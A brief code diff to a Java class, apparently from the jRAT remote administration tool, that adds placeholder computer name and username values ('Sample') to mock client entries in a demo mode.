@@ -44,6 +44,8 @@ public class SampleMode {
 			slave.setOperatingSystem(os);
 			slave.setStatus(5);
 			slave.setServerID("jrat" + new Random().nextInt(1000));
+			slave.setComputerName("Sample");
+			slave.setUsername("Sample");
 		}
 	}
 	
@@ -62,6 +64,7 @@ public class SampleMode {
 			public String getOperatingSystem() {
 				return os;
 			}
+			
 		};
 		
 		return slave;
